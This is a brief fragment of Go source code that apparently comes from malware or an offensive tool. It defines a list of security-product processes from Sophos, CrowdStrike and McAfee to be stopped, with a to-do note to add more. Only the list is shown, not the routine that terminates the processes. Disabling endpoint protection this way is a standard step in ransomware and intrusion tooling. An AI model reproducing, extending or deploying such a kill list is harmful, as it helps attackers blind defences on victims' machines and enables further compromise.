...
// StopProc holds services to stop. Sophos, Crowdstrike, McAfee. //TODO add additional processes
var StopProc = []string{
	"ManagementAgentNT.exe", "MgntSvc.exe", "SAVService.exe", "masvc.exe", "Mcshield.exe", "Scan64.exe",
	"CSFalconService.exe",
}
